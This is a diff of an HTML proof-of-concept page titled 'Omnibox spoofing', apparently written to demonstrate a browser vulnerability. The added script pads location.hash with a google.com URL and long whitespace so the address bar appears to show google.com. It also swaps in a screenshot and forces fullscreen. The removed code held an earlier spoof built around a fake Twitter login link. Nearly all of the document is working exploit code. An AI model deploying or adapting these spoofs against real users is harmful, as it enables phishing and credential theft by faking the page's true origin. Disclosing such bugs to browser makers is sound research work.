@@ -1,15 +1,53 @@
 
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Omnibox spoofing</title>
+	<style>
+		body{
+		    margin-top: 0px; 
+		    margin-bottom: 0px; 
+		    margin-left: 0px; 
+		    margin-right: 0px;
+		    padding: 0;
+		}
+	</style>
+</head>
+
+<body>
+
+	<img id="img" style="display: none;" src="https://i.imgur.com/pkg3Z6H.png"></img>
+
+	<div id="content">
+		<center>
+			<br>
+			<h1>Click on the omnibox</h1>
+		</center>
+	</div>
+
+</body>
+
 <script>
-  function next() {
-         w.location.replace('https://www.google.com:1234');
-        }
 
-  function f() {
-    w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://twitter.com";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+var spoofed = false;
+
+window.onblur = function() {
+
+	if (!spoofed) {
+		alert("You are being redirected to https://www.google.com");
+		location.hash = "  https://www.google.com                                                                                                                                                                                                                                     ";
+		document.getElementById("img").style.display = "block";
+		document.getElementById("content").style.display = "none";
+		spoofed = true;
+	}
+
+};
+
+window.onclick = function() {
+	if (spoofed) {
+		document.documentElement.webkitRequestFullScreen();
+	}
+}
+
 </script>
-
-<a href="#" onclick="f()">Login Twitter</a>
